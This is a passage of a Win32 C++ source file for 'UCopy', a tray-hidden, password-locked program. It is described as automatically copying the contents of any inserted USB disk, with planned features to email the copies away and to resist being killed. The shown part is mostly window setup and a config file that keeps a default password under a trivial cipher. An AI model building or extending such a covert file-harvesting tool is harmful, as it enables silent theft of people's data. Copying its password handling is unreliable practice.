//--------------------------------------------------------------------------------------------------------------------------//
//													Windows Application - UCopy												//
//													   		UCopy.cpp														//
//																	——2013 - 11 - 07										//
//--------------------------------------------------------------------------------------------------------------------------//
#include<Windows.h>
#include<Dbt.h>
#include<ImageHlp.h>
#include"Def.h"
#include"resource.h"
#pragma comment (lib, "ImageHlp.lib")

HDC					hdc;
PAINTSTRUCT			ps;
HINSTANCE			hInst;
LPDRAWITEMSTRUCT	pdis;
NOTIFYICONDATA		nid;
SYSTEMTIME			st;
RECT				rectBuffer1;
RECT				rectBuffer2;
HDC					hdcBuffer;
HWND				hwndBuffer;
TCHAR				szBuffer1[1024];
TCHAR				szBuffer2[1024];
INT					iBuffer;
BOOL				bBuffer;
HPEN				hpenBuffer;
HANDLE				handleBuffer;
DWORD				dwBuffer;
static HBRUSH		hbrBk;
static HBRUSH		hbrBtnSelect;
static HWND			hwndLogEditPwd;
static HWND			hwndLogBtnHide;
static HWND			hwndLogBtnLogin;
static HWND			hwndSetBtnHelp;
static HWND			hwndSetBtnSave;
static HWND			hwndSetBtnChgPwd;
static HWND			hwndSetBtnHide;
static HWND			hwndSetBtnExit;
static HWND			hwndSetEditPathFIL;
static HWND			hwndSetBtnChooseFTN;
static HWND			hwndSetEditPathFTN;
static HWND			hwndSetBtnChooseCheckNoCopyFile;
static HWND			hwndSetBtnEditCheckNoCopyFileName;
static HWND			hwndSetBtnChoosePreventProcessClose;
static HWND			hwndChgPwdBtnReturn;
static HWND			hwndChgPwdBtnSave;
static HWND			hwndChgPwdEditOld;
static HWND			hwndChgPwdEditNew1;
static HWND			hwndChgPwdEditNew2;
static HWND			hwndHelpBtnReturn;
static HWND			hwndHelpStaticText;
static INT			iStep;
static TCHAR		szDataFolder		[24];
static TCHAR		szDataPath			[32];
static TCHAR		szPassword			[17];
static TCHAR		szFileInLocal		[1024];
static BOOL			bFileToNet;
static TCHAR		szFileToNet			[1024];
static BOOL			bCheckFileNoCopy;
static TCHAR		szCheckFileNoCopy	[260];
static BOOL			bPreventProcessClose;
static INT			iHelpTextPos;
static const PTCHAR	szHelpText = TEXT(
										"        谢谢您的支持，这是一个测试版的软件。该软件的用途为对接入的外"	
										"部磁盘进行自动读取并拷贝到指定的文件夹中，该软件预计支持一些可选拓展"	
										"功能，可以将拷贝下的文件打包发送至指定邮箱中，检索外部磁盘根目录是否"	
										"有设置中的指定文件以忽略拷贝此磁盘，阻止进程查杀程序。目前该软件仍属"	
										"于测试阶段，暂时不支持将拷贝下的文件打包发送至指定邮箱中的拓展功能，"
										"给您带来的使用不便，敬请谅解。\n"																		\
										"声明：\n"															
										"        任何人不得利用、转借该软件做非法事情，不得有绑定、借用、反编"	
										"译该软件等侵犯制作人权利的行为。\n\n\n"							
										"制作人：KondeU\n2013-12-08\n发行版 V1.0.0.0"
										"\n\n\n\n\n"
									 );

LRESULT CALLBACK WndProc	(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
{
    HWND		hwnd;
    MSG			msg;
    WNDCLASS	wndclass;
	
	//窗口结构
	wndclass.hInstance		= hInstance;											//窗口实例句柄（程序本身）
	wndclass.lpszClassName	= TEXT("UCopy-MainWindowsClass");						//窗口类名称
	wndclass.lpfnWndProc	= WndProc;												//窗口过程
	//窗口样式
	wndclass.style			= 0;													//窗口风格
	wndclass.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_PROICON));	//窗口图标
	wndclass.hCursor		= LoadCursor(NULL, IDC_ARROW);							//窗口鼠标
	wndclass.lpszMenuName	= NULL;													//窗口菜单栏
	wndclass.hbrBackground	= (hbrBk = CreateSolidBrush(RGB(200,200,200)));			//窗口背景画刷
	//扩展
	wndclass.cbClsExtra		= 0;													//窗口类扩展
	wndclass.cbWndExtra		= 0;													//窗口扩展

	//注册窗口类，检测是否成功，注册失败程序退出。
	if(!RegisterClass(&wndclass))
	{
		//窗口注册失败
		MessageBox(NULL, TEXT("程序窗口注册失败，程序已退出！"), TEXT("应用程序提示"), MB_ICONERROR);
		return 0;
	}

	//创建程序窗口
	hwnd =
		CreateWindow(
						TEXT("UCopy-MainWindowsClass"),		//窗口类名称
						TEXT("应用程序"),					//窗口标题
						WS_OVERLAPPED,						//窗口风格（窗口格式）
						CW_USEDEFAULT, CW_USEDEFAULT,		//窗口初始坐标
						300, 300,							//窗口初始尺寸
						NULL,								//父窗口句柄
						NULL,								//窗口菜单句柄 
						hInstance,							//程序实例句柄
						NULL								//窗口创建参数
					);

	ShowWindow(hwnd, SW_NORMAL);
	UpdateWindow(hwnd);

	//隐藏系统托盘设置：初始化NOTIFYICONDATA结构
	nid.cbSize				= sizeof(NOTIFYICONDATA);
	nid.hWnd				= hwnd;
	nid.uID					= IDI_PROICON;
	nid.uFlags				= NIF_ICON | NIF_MESSAGE | NIF_TIP;
	nid.uCallbackMessage	= WM_PROSYSTRAY;
	nid.hIcon				= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_PROICON));
	wsprintf(nid.szTip, TEXT("磁盘文件实时监控"));

	//消息循环
    while (GetMessage(&msg, NULL, 0, 0))
    {
		//将虚拟键消息转换为字符消息
        TranslateMessage(&msg);
        //将消息发送给窗口过程
        DispatchMessage(&msg);
    }
    return msg.wParam;
}

//窗口过程
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
		case WM_CREATE:

			//获得程序窗口实例句柄
			hInst = ((LPCREATESTRUCT)lParam)->hInstance;

			//按钮被单击时改变颜色的画刷
			hbrBtnSelect = CreateSolidBrush(RGB(215, 215, 215));

			//获得存储的数据
			GetSystemWindowsDirectory(szBuffer1, 1024);
			for(iBuffer = 0; szBuffer1[iBuffer] != '\\'; iBuffer++);
			szBuffer1[iBuffer] = '\0';
			//wsprintf(szDataFolder, TEXT("%s%s"), szBuffer1,	   TEXT("\\Program Files\\UCY\\")); //szDataFolder: 数据文件夹路径
			//-------------------------------------------------
			wsprintf(szDataFolder, TEXT("%s%s"), szBuffer1,	   TEXT("\\UCY\\")); //szDataFolder: 数据文件夹路径				
			wsprintf(szDataPath,   TEXT("%s%s"), szDataFolder, TEXT("data.dat"));				//szDataPath:   数据文件路径

			if(INVALID_HANDLE_VALUE == (handleBuffer = CreateFile(szDataPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)))
			{
				dwBuffer = GetLastError();
				CreateDirectory(szDataFolder, NULL);//-----------------------------------------------------------------------
				handleBuffer = CreateFile(szDataPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				if(handleBuffer == INVALID_HANDLE_VALUE)//出错
				{
					iBuffer = GetLastError();
					wsprintf(szBuffer2, TEXT("Error:\nGetLastError:CreateFile:Create:data.dat:%d,%d"), dwBuffer, iBuffer);
					MessageBox(hwnd, TEXT(szBuffer2), TEXT("错误"), MB_ICONERROR);
					PostQuitMessage(iBuffer);
				}
				else
				{
					MessageBox(hwnd, TEXT("这是您第一次使用该软件或程序数据丢失，应用程序将初始化所需数据。"), TEXT("提示"), MB_OK);
					
					//创建数据

					wsprintf(szPassword,		TEXT("%s"),		TEXT("123456")						);
					wsprintf(szFileInLocal,		TEXT("%s%s"),	TEXT(szBuffer1), TEXT("\\UCYFILE")	);
					wsprintf(szFileToNet,		TEXT("%s"),		TEXT(".com")						);
					wsprintf(szCheckFileNoCopy, TEXT("%s"),		TEXT("CheckFileNoCopy.txt")			);
					bFileToNet				= 0;
					bCheckFileNoCopy		= 0;
					bPreventProcessClose	= 0;
					
					//对密码加密后保存
					lstrcpy(szBuffer2, szPassword);
					for(iBuffer = 0; iBuffer < 17; iBuffer++)
						szBuffer2[iBuffer] -= iBuffer;

					WriteFile(handleBuffer, TEXT(szBuffer2),		17		* sizeof(TCHAR), &dwBuffer, NULL);
					WriteFile(handleBuffer, TEXT(szFileInLocal),	1024	* sizeof(TCHAR), &dwBuffer, NULL);
					WriteFile(handleBuffer, &bFileToNet,			1		* sizeof(BOOL),	 &dwBuffer, NULL);
					WriteFile(handleBuffer, TEXT(szFileToNet),		1024	* sizeof(TCHAR), &dwBuffer, NULL);
					WriteFile(handleBuffer, &bCheckFileNoCopy,		1		* sizeof(BOOL),	 &dwBuffer, NULL);
					WriteFile(handleBuffer, TEXT(szCheckFileNoCopy),260		* sizeof(TCHAR), &dwBuffer, NULL);
					WriteFile(handleBuffer, &bPreventProcessClose,	1		* sizeof(BOOL),	 &dwBuffer, NULL);
					CloseHandle(handleBuffer);

					MessageBox(hwnd, TEXT("数据初始化已完成，初始化密码为123456。"), TEXT("提示"), MB_OK);
				}

			}
			else
			{
				//数据文件打开成功，读入数据			
				ReadFile(handleBuffer, szPassword,				17		* sizeof(TCHAR), &dwBuffer, NULL);
				ReadFile(handleBuffer, szFileInLocal,			1024	* sizeof(TCHAR), &dwBuffer, NULL);		
				ReadFile(handleBuffer, &bFileToNet,				1		* sizeof(BOOL),	 &dwBuffer, NULL);		
				ReadFile(handleBuffer, szFileToNet,				1024	* sizeof(TCHAR), &dwBuffer, NULL);	
				ReadFile(handleBuffer, &bCheckFileNoCopy,		1		* sizeof(BOOL),	 &dwBuffer, NULL);
				ReadFile(handleBuffer, szCheckFileNoCopy,		260		* sizeof(TCHAR), &dwBuffer, NULL);		
				ReadFile(handleBuffer, &bPreventProcessClose,	1		* sizeof(BOOL),	 &dwBuffer, NULL);
				CloseHandle(handleBuffer);

				//对密码解密后加载入内存
				for(iBuffer = 0; iBuffer < 17; iBuffer++)
					szPassword[iBuffer] += iBuffer;
			}
			
			//创建用户密码输入子窗口编辑类控件（StepLog）
			hwndLogEditPwd = 
				CreateWindow(
								TEXT("edit"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | WS_BORDER | \
								ES_PASSWORD | ES_LEFT,				//窗口风格（窗口格式）
								85, 
								125,								//窗口初始坐标
								105, 
								16,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_LOG_EDIT_PWD,			//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建用于“隐藏”按钮子窗口控件（StepLog）
			hwndLogBtnHide = 
				CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								215, 
								220,								//窗口初始坐标
								40, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_LOG_BTN_HIDE,			//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建用于“进入”按钮子窗口控件（StepLog）
			hwndLogBtnLogin = 
				CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								200, 
								123,								//窗口初始坐标
								40, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_LOG_BTN_LOGIN,		//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建用于“帮助”按钮的子窗口控件
			hwndSetBtnHelp = 
				CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								180, 
								10,									//窗口初始坐标
								40, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_SET_BTN_HELP,			//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建用于“保存”按钮的子窗口控件
			hwndSetBtnSave = 
				CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								235, 
								10,									//窗口初始坐标
								40, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_SET_BTN_SAVE,			//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建用于“更改密码”按钮的子窗口控件
			hwndSetBtnChgPwd = 
				CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								20, 
								235,								//窗口初始坐标
								80, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_SET_BTN_CHGPWD,		//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建用于Set中“隐藏”按钮的子窗口控件
			hwndSetBtnHide = 
				CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								180, 
								235,								//窗口初始坐标
								40, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_SET_BTN_HIDE,			//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建用于“退出”按钮的子窗口控件
			hwndSetBtnExit = 
				CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								235, 
								235,								//窗口初始坐标
								40, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_SET_BTN_EXIT,			//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建文件保存本地路径子窗口编辑类控件
			hwndSetEditPathFIL = 
				CreateWindow(
								TEXT("edit"),						//窗口类名称
								szFileInLocal,						//窗口标题
								WS_CHILD | WS_BORDER | \
								ES_AUTOHSCROLL | ES_LEFT,			//窗口风格（窗口格式）
								75, 
								68,									//窗口初始坐标
								184, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_SET_EDIT_PATH_FIL,	//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建文件发送邮箱复选框按钮子窗口控件
			hwndSetBtnChooseFTN = 
				CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								10, 
								102,								//窗口初始坐标
								12, 
								12,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_SET_BTN_CHOOSE_FTN,	//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建文件发送邮箱子窗口编辑类控件
			hwndSetEditPathFTN = 
				CreateWindow(
								TEXT("edit"),						//窗口类名称
								szFileToNet,						//窗口标题
								WS_CHILD | WS_BORDER | \
								ES_AUTOHSCROLL | ES_LEFT,			//窗口风格（窗口格式）
								75, 
								118,								//窗口初始坐标
								184, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_SET_EDIT_PATH_FTN,	//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建检测文件不被复制复选框按钮子窗口控件
			hwndSetBtnChooseCheckNoCopyFile = 
				CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								10, 
								152,								//窗口初始坐标
								12, 
								12,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_SET_BTN_CHOOSE_CNCF,	//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建检测文件不被复制文件名子窗口编辑类控件
			hwndSetBtnEditCheckNoCopyFileName = 
				CreateWindow(
								TEXT("edit"),						//窗口类名称
								szCheckFileNoCopy,					//窗口标题
								WS_CHILD | WS_BORDER | \
								ES_AUTOHSCROLL | ES_LEFT,			//窗口风格（窗口格式）
								75, 
								168,								//窗口初始坐标
								184, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_SET_EDIT_CNCFN,		//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建阻止进程关闭的复选框按钮子窗口控件
			hwndSetBtnChoosePreventProcessClose = 
				CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								10, 
								202,								//窗口初始坐标
								12, 
								12,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_SET_BTN_CHOOSE_PPC,	//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建更改密码界面返回按钮子窗口控件
			hwndChgPwdBtnReturn = 
					CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								45, 
								210,								//窗口初始坐标
								40, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_CHGPWD_BTN_RETURN,	//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建更改密码界面确认更改按钮子窗口控件
			hwndChgPwdBtnSave = 
					CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								170, 
								210,								//窗口初始坐标
								80, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_CHGPWD_BTN_SAVE,		//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建更改密码界面输入旧密码的编辑类控件
			hwndChgPwdEditOld = 
				CreateWindow(
								TEXT("edit"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | WS_BORDER | \
								ES_PASSWORD | ES_LEFT,				//窗口风格（窗口格式）
								140, 
								50,									//窗口初始坐标
								105, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_CHGPWD_EDIT_OLD,		//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建更改密码界面输入新密码1的编辑类控件
			hwndChgPwdEditNew1 = 
				CreateWindow(
								TEXT("edit"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | WS_BORDER | \
								ES_PASSWORD | ES_LEFT,				//窗口风格（窗口格式）
								140, 
								100,								//窗口初始坐标
								105, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_CHGPWD_EDIT_NEW1,		//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建更改密码界面输入新密码2的编辑类控件
			hwndChgPwdEditNew2 = 
				CreateWindow(
								TEXT("edit"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | WS_BORDER | \
								ES_PASSWORD | ES_LEFT,				//窗口风格（窗口格式）
								140, 
								150,								//窗口初始坐标
								105, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_CHGPWD_EDIT_NEW2,		//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建帮助界面返回按钮自绘子窗口按钮控件
			hwndHelpBtnReturn = 
				CreateWindow(
								TEXT("button"),						//窗口类名称
								NULL,								//窗口标题
								WS_CHILD | BS_OWNERDRAW,			//窗口风格（窗口格式）
								20, 
								235,								//窗口初始坐标
								40, 
								20,									//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_HELP_BTN_RETURN,		//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			//创建帮助文档显示静态控件
			hwndHelpStaticText = 
				CreateWindow(
								TEXT("static"),						//窗口类名称
								szHelpText,							//窗口标题
								WS_CHILD | SS_LEFT ,				//窗口风格（窗口格式）
								35, 
								30,									//窗口初始坐标
								220, 
								200,								//窗口初始尺寸
								hwnd,								//父窗口句柄
								(HMENU)CTL_ID_HELP_STATIC_TEXT,		//子窗口ID 
								hInst,								//程序实例句柄
								NULL								//窗口创建参数
							);

			iStep = STEPLOG;

			return 0;

		case WM_DRAWITEM:
			//获得按钮相关信息
			pdis = (LPDRAWITEMSTRUCT)lParam;
			hdcBuffer = pdis->hDC;
			iBuffer = pdis->CtlID;
			rectBuffer1 = pdis->rcItem;
			SetRect(&rectBuffer2, rectBuffer1.left + 2, rectBuffer1.top + 2, rectBuffer1.right - 2, rectBuffer1.bottom - 2);

			switch(iBuffer)
			{
				case CTL_ID_LOG_BTN_HIDE:
				case CTL_ID_LOG_BTN_LOGIN:
				case CTL_ID_SET_BTN_HELP:
				case CTL_ID_SET_BTN_SAVE:
				case CTL_ID_SET_BTN_CHGPWD:	
				case CTL_ID_SET_BTN_HIDE:	
				case CTL_ID_SET_BTN_EXIT:
				case CTL_ID_CHGPWD_BTN_RETURN:
				case CTL_ID_CHGPWD_BTN_SAVE:
				case CTL_ID_HELP_BTN_RETURN:
					RoundRect(hdcBuffer, rectBuffer1.left, rectBuffer1.top, rectBuffer1.right, rectBuffer1.bottom, 2, 2);
					break;
				case CTL_ID_SET_EDIT_PATH_FIL:	
				case CTL_ID_SET_BTN_CHOOSE_FTN:	
				case CTL_ID_SET_EDIT_PATH_FTN:	
				case CTL_ID_SET_BTN_CHOOSE_CNCF:
				case CTL_ID_SET_EDIT_CNCFN:	
				case CTL_ID_SET_BTN_CHOOSE_PPC:	
					Rectangle(hdcBuffer, rectBuffer1.left, rectBuffer1.top, rectBuffer1.right, rectBuffer1.bottom);
					break;
			}

			SetBkMode(hdcBuffer, TRANSPARENT);
			SetBkColor(hdcBuffer, RGB(215, 215, 215));

			if(pdis->itemState & ODS_SELECTED)
				FillRect(hdcBuffer, &rectBuffer2, hbrBtnSelect);	

			if(pdis->itemState & ODS_FOCUS)
				DrawFocusRect(hdcBuffer, &rectBuffer2);
			
			switch(iBuffer)
			{
				//显示自绘窗口文本
				case CTL_ID_LOG_BTN_HIDE: 
				case CTL_ID_SET_BTN_HIDE:
					DrawText(hdcBuffer, TEXT("隐藏"), -1, &rectBuffer2, DT_CENTER);
					break;
				case CTL_ID_LOG_BTN_LOGIN:
					DrawText(hdcBuffer, TEXT("进入"), -1, &rectBuffer2, DT_CENTER);
					break;
				case CTL_ID_SET_BTN_HELP:
					DrawText(hdcBuffer, TEXT("帮助"), -1, &rectBuffer2, DT_CENTER);
					break;
				case CTL_ID_SET_BTN_SAVE:
					DrawText(hdcBuffer, TEXT("保存"), -1, &rectBuffer2, DT_CENTER);
					break;
				case CTL_ID_SET_BTN_CHGPWD:
					DrawText(hdcBuffer, TEXT("更改密码"), -1, &rectBuffer2, DT_CENTER);
					break;
				case CTL_ID_SET_BTN_EXIT:
					DrawText(hdcBuffer, TEXT("退出"), -1, &rectBuffer2, DT_CENTER);
					break;
				case CTL_ID_CHGPWD_BTN_RETURN:
				case CTL_ID_HELP_BTN_RETURN:
					DrawText(hdcBuffer, TEXT("返回"), -1, &rectBuffer2, DT_CENTER);
					break;
				case CTL_ID_CHGPWD_BTN_SAVE:
					DrawText(hdcBuffer, TEXT("确认更改"), -1, &rectBuffer2, DT_CENTER);
					break;

				//显示自绘复选框的状态
				case CTL_ID_SET_BTN_CHOOSE_FTN:
					if(bFileToNet)
					{
						SetRect(&rectBuffer2, rectBuffer2.left + 1, rectBuffer2.top + 1, rectBuffer2.right - 1, rectBuffer2.bottom - 1);
						FillRect(hdcBuffer, &rectBuffer2, (HBRUSH)GetStockObject(BLACK_BRUSH));
					}
					break;
				case CTL_ID_SET_BTN_CHOOSE_CNCF:
					if(bCheckFileNoCopy)
					{
						SetRect(&rectBuffer2, rectBuffer2.left + 1, rectBuffer2.top + 1, rectBuffer2.right - 1, rectBuffer2.bottom - 1);
						FillRect(hdcBuffer, &rectBuffer2, (HBRUSH)GetStockObject(BLACK_BRUSH));
					}
					break;
				case CTL_ID_SET_BTN_CHOOSE_PPC:
					if(bPreventProcessClose)
					{
						SetRect(&rectBuffer2, rectBuffer2.left + 1, rectBuffer2.top + 1, rectBuffer2.right - 1, rectBuffer2.bottom - 1);
						FillRect(hdcBuffer, &rectBuffer2, (HBRUSH)GetStockObject(BLACK_BRUSH));
					}
					break;
			}
			return 0;


		case WM_PAINT:
			hdc = BeginPaint(hwnd, &ps);
			//将文本显示模式调整为透明
			SetBkMode(hdc, TRANSPARENT);
			switch(iStep)
			{
				case STEPLOG:	
					//显示输入密码的窗口
					ShowWindow(hwndLogEditPwd, SW_NORMAL);
					//显示“隐藏”按钮窗口
					ShowWindow(hwndLogBtnHide, SW_NORMAL);
					//显示“进入”按钮窗口
					ShowWindow(hwndLogBtnLogin, SW_NORMAL);
					//显示提示输入密码文本
					TextOut(hdc, 35, 125, TEXT("密码："), lstrlen(TEXT("密码：")));
					//显示应用程序相关信息
					TextOut(hdc, 25, 225, TEXT("版本：发行版 V 1.0.0.0"), lstrlen(TEXT("版本：测试版 V 1.0.0.0")));
					break;

				case STEPSET:
					TextOut(hdc, 10, 10,  TEXT("设置："),				lstrlen(TEXT("设置："))					);
					TextOut(hdc, 10, 50,  TEXT("文件本地保存"),			lstrlen(TEXT("文件本地保存"))			);
					TextOut(hdc, 30, 70,  TEXT("路径："),				lstrlen(TEXT("路径："))					);
					TextOut(hdc, 25, 100, TEXT("拷贝文件至指定邮箱"),	lstrlen(TEXT("拷贝文件至指定邮箱"))		);
					TextOut(hdc, 30, 120, TEXT("路径："),				lstrlen(TEXT("路径："))					);
					TextOut(hdc, 25, 150, TEXT("检索指定文件不复制"),	lstrlen(TEXT("检索指定文件不复制"))		);
					TextOut(hdc, 30, 170, TEXT("文件："),				lstrlen(TEXT("文件："))					);
					TextOut(hdc, 25, 200, TEXT("阻止进程关闭"),			lstrlen(TEXT("阻止进程关闭"))			);
					break;

				case STEPCHGPWD:
					TextOut(hdc, 30, 50,  TEXT("请输入旧密码："), lstrlen(TEXT("请输入旧密码：")));
					TextOut(hdc, 30, 100, TEXT("请输入新密码："), lstrlen(TEXT("请输入新密码：")));
					TextOut(hdc, 30, 150, TEXT("请确认新密码："), lstrlen(TEXT("请确认新密码：")));
					break;

				case STEPHELP:
					TextOut(hdc, 10, 10, TEXT("帮助文档"), lstrlen(TEXT("帮助文档")));
					break;
			}
			EndPaint(hwnd, &ps);
			return 0;

		case WM_COMMAND:
			if(HIWORD(wParam) == BN_CLICKED)//所有按键均只处理单击消息
			{
				switch(LOWORD(wParam))//子窗口ID消息
				{
					//隐藏按钮
					case CTL_ID_LOG_BTN_HIDE:
						ShowWindow(hwnd, SW_HIDE);
						Shell_NotifyIcon(NIM_ADD, &nid);
						break;
					case CTL_ID_SET_BTN_HIDE:
						ShowWindow(hwnd, SW_HIDE);
						Shell_NotifyIcon(NIM_ADD, &nid);
						SetWindowText(hwnd,				TEXT("应用程序")	);
						SetWindowText(hwndLogEditPwd,	TEXT("")		);
						ShowWindow(hwndSetBtnHelp,						SW_HIDE);
						ShowWindow(hwndSetBtnSave,						SW_HIDE);
						ShowWindow(hwndSetBtnChgPwd,					SW_HIDE);
						ShowWindow(hwndSetBtnHide,						SW_HIDE);
						ShowWindow(hwndSetBtnExit,						SW_HIDE);
						ShowWindow(hwndSetEditPathFIL,					SW_HIDE);
						ShowWindow(hwndSetBtnChooseFTN,					SW_HIDE);
						ShowWindow(hwndSetEditPathFTN,					SW_HIDE);
						ShowWindow(hwndSetBtnChooseCheckNoCopyFile,		SW_HIDE);
						ShowWindow(hwndSetBtnEditCheckNoCopyFileName,	SW_HIDE);
						ShowWindow(hwndSetBtnChoosePreventProcessClose,	SW_HIDE);
						ShowWindow(hwndLogEditPwd,						SW_SHOW);
						ShowWindow(hwndLogBtnHide,						SW_SHOW);
						ShowWindow(hwndLogBtnLogin,						SW_SHOW);
						iStep = STEPLOG;
						break;

					//进入按钮
					case CTL_ID_LOG_BTN_LOGIN:
						GetWindowText(hwndLogEditPwd, szBuffer1, 17);
						if(!lstrcmp(szBuffer1, szPassword))
						{
							//密码正确重绘窗口和改变控件显示
							SetWindowText(hwnd, TEXT("自动U盘复制器 发行版V1.0.0.0"));
							ShowWindow(hwndLogEditPwd,						SW_HIDE);
							ShowWindow(hwndLogBtnHide,						SW_HIDE);
							ShowWindow(hwndLogBtnLogin,						SW_HIDE);
							ShowWindow(hwndSetBtnHelp,						SW_SHOW);
							ShowWindow(hwndSetBtnSave,						SW_SHOW);
							ShowWindow(hwndSetBtnChgPwd,					SW_SHOW);
							ShowWindow(hwndSetBtnHide,						SW_SHOW);
							ShowWindow(hwndSetBtnExit,						SW_SHOW);
							ShowWindow(hwndSetEditPathFIL,					SW_SHOW);
							ShowWindow(hwndSetBtnChooseFTN,					SW_SHOW);
							ShowWindow(hwndSetEditPathFTN,					SW_SHOW);
							ShowWindow(hwndSetBtnChooseCheckNoCopyFile,		SW_SHOW);
							ShowWindow(hwndSetBtnEditCheckNoCopyFileName,	SW_SHOW);
							ShowWindow(hwndSetBtnChoosePreventProcessClose,	SW_SHOW);
							iStep = STEPSET;
							InvalidateRect(hwnd, NULL, TRUE);							
						}
						else
						{
							MessageBox(hwnd, TEXT("密码错误！请重新输入！"), TEXT("提示"), MB_OK | MB_ICONWARNING);
						}
						break;
					
					//三个自绘复选框
					case CTL_ID_SET_BTN_CHOOSE_FTN:
						bFileToNet = !bFileToNet;
						SetRect(&rectBuffer1,3, 3, 9, 9);
						hdcBuffer = GetDC(hwndSetBtnChooseFTN);
						if(bFileToNet)
							FillRect(hdcBuffer, &rectBuffer1, (HBRUSH)GetStockObject(BLACK_BRUSH));		
						else
